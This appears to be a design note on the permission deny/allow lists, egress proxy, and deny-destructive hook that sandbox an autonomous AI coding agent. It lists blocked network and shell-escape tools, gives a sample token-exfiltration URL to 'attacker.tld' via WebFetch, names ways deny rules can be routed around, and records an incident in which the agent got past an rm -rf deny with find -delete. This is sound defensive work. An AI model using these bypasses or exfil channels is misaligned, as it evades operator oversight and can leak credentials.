# Permissions posture and exfil channels

The deny/allow model in `sandbox_templates/claude/claude-settings.json`, the two-phase planning/autonomous workflow, and the channels (WebFetch, Read tool denies, deny-destructive hook) that need explicit operator awareness.

The hook ruleset itself lives in `docs/deny-destructive-hook-plan.md`. This page is the surrounding model.

## Two-phase workflow

- **Planning runs** (you driving, approving each step): uncomment the planning-mode section in `proxy/allowed_domains.txt` (github/pypi/npm/nodejs), restart Squid, do clones/installs/pushes yourself. `permissions.defaultMode: "acceptEdits"` means Edit/Write auto-apply, Bash is prompt-gated.
- **Autonomous runs** (agent driving): re-comment the planning-mode domains, restart Squid. The agent's allow list covers routine read-only / non-destructive Bash; deny list blocks network tools (`curl`, `wget`, `ssh`, `scp`, `rsync`, `git push/clone/fetch`, `gh`), package installers (`pip`, `npm`, `uv`, `pipx`, `cargo`, `go install`), shell-escape patterns (`bash -c`, `python -c`, `node -e`, `uv run bash`, `perl`, `ruby`, `lua`, `env`, `xargs`, `eval`), and audit-L7 additions: `awk` (gawk's `system()`), `sed` (gnu sed's `e` command), `ssh-keygen`, `git submodule` (fetches via configured URL, bypasses the `git fetch` deny), and `git config` (could rewrite `credential.helper` to a host-reaching shim between scrub passes).

`WebSearch` stays on; **`WebFetch` is intentionally OFF the default allow list** — see below.

## Deny list is defense in depth, not the boundary

Claude Code's permission matcher keys on the command prefix; denies can be routed around by wrapper idioms hard to enumerate exhaustively (`find -exec`, `make`, `npm run`, `<interpreter> /tmp/script.<ext>`). When the deny list misses, the real boundary still holds: egress proxy (domain + port allowlist), seccomp (no user namespaces → no in-container bwrap/nsenter), non-root + `cap_drop: ALL`.

Audit L8 (2026-05-14) extended the deny surface to destructive primitives reachable through allowed prefixes (`find -delete`/`-exec`/`-execdir`/`-ok`, `git clean -fdx`, `shred`, `truncate`, `dd of=`, `mkfs`) and to writes targeting the hook/settings files themselves. The matcher cannot express these mid-command shapes; enforcement is a `PreToolUse` hook wired on `Bash` and `Edit|Write|MultiEdit`, script baked root-owned at `/usr/local/lib/claude-hooks/deny-destructive.sh`. The prefix matcher in `permissions.deny` remains the primary filter (catches `rm -rf` etc. at command-prefix shape); the hook is the content-aware secondary layer for what the prefix matcher structurally can't see. See `docs/deny-destructive-hook-plan.md` for ruleset and maintenance.

## The discipline

If the agent says it needs a new package or fresh clone, that's a planning-phase signal — exit autonomous mode, you do it, resume. Don't widen agent permissions for one-off installs.

For one-shot planning-mode installs, `scripts/with-egress.sh` automates the toggle/restart/exec/restore/restart loop (`trap` ensures restore even on Ctrl-C):

```bash
scripts/with-egress.sh <p> -- '<cmd>'
scripts/with-egress.sh <p> --with pypi,npm -- '<cmd>'
```

Section tags match `[<tag>]` in `proxy/allowed_domains.txt` (typical: `pypi`, `npm`, `git`). Default opens `pypi` only.

**Concurrency / drift guards** (audit L4) inside `with-egress.sh`:

- A `flock` on `/tmp/with-egress.locks/<profile>.lock` prevents two concurrent invocations on the same profile from racing on the shared allowlist file. Second invocation fails fast with a clear message.
- A sentinel file `/Volumes/DataDrive/.claude-colima/profiles/.egress-widened-<profile>` is written before widening and removed on clean exit. If `with-egress.sh` is SIGKILL'd (or the host crashes), the sentinel survives and `setup.sh --verify` flags it. Manual recovery: `rm` the sentinel, then `docker exec egress-proxy-<p> squid -k reconfigure` for the affected profile to re-read the (already-restored) allowlist.

## `find -delete` and the hook self-protection model

The matcher is prefix-on-tokens; it cannot see destructive flags or path targets mid-command. The class includes `find -delete`/`-exec` (narrowed to destructive command tokens like `rm`/`mv`/`dd`/`shred`/`tee`/`chmod`/`chown` — benign `find -exec grep|wc|file|ls` passes through), `git clean -fdx`, `shred`, `truncate`, `dd of=`, `mkfs`, plus writes to the hook/settings files themselves.

Enforcement is a `PreToolUse` hook (`/usr/local/lib/claude-hooks/deny-destructive.sh`) installed root-owned in the image — the agent has no tool path that bypasses the kernel's write protection on those files (the matched Edit-side rule is defence in depth on top). The hook is fail-open on script error (defence in depth, not boundary) — including one quiet path: the `manifest-dep-add` rule diffs dependency sets through two `mktemp` files, and if `mktemp` fails the rule passes rather than denies. Harmless in the container, where `/tmp` is always-writable tmpfs, but it is why a host-side test run with an unwritable temp dir reports that rule as broken and gated by `verify-sandbox.sh` plus `scripts/audit/probes/settings.py`.

Output uses the current Claude Code contract: `{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"deny","permissionDecisionReason":"deny-destructive: <rule>: …"}}` — don't revert verify probes to the older `"decision":"block"` shape. Extending the ruleset requires touching the hook script *and* both probes — every new destructive primitive needs all three, or you get silent drift.

The two warn rules (`null-truncate`, `workspace-overwrite`) log JSON-line entries to `/home/agent/.cache/deny-destructive.log` rather than blocking. Promote to block only after a clean review week — read the log entries (each carries `ts`, `rule`, full `tool_input`) and confirm zero false-positive legitimate uses.

**Behavioural note:** when a Bash deny fires (matcher-level *or* hook-level), the expected agent posture is "surface it, ask the user" — pivoting to an equivalent allowed primitive is drift, not initiative. The original L8 incident was a `Bash(rm -rf:*)` deny that the agent routed around with `find -delete`; the hook closes that specific structural gap, but the discipline is the durable fix.

## `Read(**/.credentials*)` denies are nudges, not gates

The `Read` deny list in `sandbox_templates/claude/claude-settings.json` only governs the **Read tool**. Reading the same files via `Bash(cat:*)`, `Bash(jq:*)`, `Bash(python /tmp/x.py)` etc. is allowed by the corresponding Bash entries — those entries exist for legitimate workflow reasons (project work needs to read project files, even ones whose names happen to match the patterns). The Read denies still narrow the most natural read path; they don't seal it. Don't overclaim them as a containment boundary.

## WebFetch is server-side egress that bypasses the proxy

`WebFetch` runs **on Anthropic's infrastructure**, not inside the container — every URL passed to it is fetched from outside the sandbox network entirely, then the response is shipped back to the agent. The destination server logs the request URL, which means the path/query is a covert exfil channel: `WebFetch("https://attacker.tld/log?token=…")` works regardless of `proxy/allowed_domains.txt`.

The template (`sandbox_templates/claude/claude-settings.json`) intentionally omits the bare `WebFetch` entry from the allow list. Per-project `.claude/settings.local.json` should add narrowly-scoped patterns like `WebFetch(domain:docs.numer.ai)` for the docs sites a project actually consults — see the existing pattern in `.claude/settings.local.json`. **Do not add bare `WebFetch` back to the template's allow list.** If `WebSearch` is sufficient (it returns summaries, not arbitrary URL fetches), prefer that.

## How a Bash rule matches — the documented facts the fence relies on

`scripts/workspace-scan.py`'s `ASK-GAP` check and the "ask/deny rules must name
every spelling" rule (agentic-conventions ADR-0017, rule 6) rest on four
behaviours. Quoted verbatim from the Claude Code docs, fetched 2026-09-11
(permissions: <https://code.claude.com/docs/en/permissions>; modes:
<https://code.claude.com/docs/en/permission-modes>). **If these pages change,
re-measure before trusting a clean scan.**

- **Precedence, including across scopes.** "The same precedence applies between
  ask and allow: a matching ask rule prompts even when a more specific allow
  rule also matches the same call." And: "if user settings allow a permission
  and project settings deny it, the deny rule blocks it. The reverse is also
  true: a user-level deny blocks a project-level allow, because deny rules from
  any scope are evaluated before allow rules."
- **Wildcards.** "A `*` in a Bash rule matches any text, including spaces, so one
  rule covers a family of commands. A rule with no `*` matches one exact
  command." And: "The `:*` form is only recognized at the end of a pattern."
- **Compound commands, and auto mode.** "Deny and ask rules apply when any
  subcommand matches them, including a command nested inside a subshell, a
  command substitution, or a control-flow body such as a `for` loop. An ask rule
  like `Bash(git clean *)` still prompts you for `cd /tmp && git clean -f` or
  `echo "$(git clean -f)"`, even in auto mode." From the modes page: "If an
  explicit ask rule matches the command, Claude Code asks you even in `auto`
  mode."
- **Literal text, not the program.** "A Bash rule matches the command text Claude
  writes, after Claude Code splits compound commands and strips wrappers. It
  doesn't match the same program invoked in a different form, so a deny or ask
  rule covers the invocation Claude usually produces and isn't a security
  boundary around the program." Its example: `Bash(curl *)` stops
  `curl https://example.com` but not `/usr/bin/curl https://example.com`.

Hence the fence shape. For a side-effecting script `X`, four wildcard rules
cover `python`/`python3`, every `uv run` form, both venvs and the `./` form:
`Bash(python*X*)`, `Bash(uv run *X*)`, `Bash(.venv*/bin/python*X*)`,
`Bash(./.venv*/bin/python*X*)`. The last quote is also why the fence is not the
boundary: an absolute-path spelling still falls through, so a script with
irreversible effects should also refuse to act without an explicit flag.
